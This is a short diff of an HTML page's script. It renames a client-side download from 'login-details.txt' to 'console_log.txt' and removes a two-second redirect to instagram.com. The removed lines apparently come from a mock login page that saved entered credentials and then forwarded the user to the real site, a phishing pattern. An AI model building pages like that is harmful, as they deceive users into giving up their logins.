@@ -30,12 +30,8 @@
             const blob = new Blob([data], { type: 'text/plain' });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = 'login-details.txt';
+            link.download = 'console_log.txt';
             link.click();
-
-            setTimeout(() => {
-                window.location.href = "https://www.instagram.com";
-            }, 2000);
         });
     </script>
 </body>
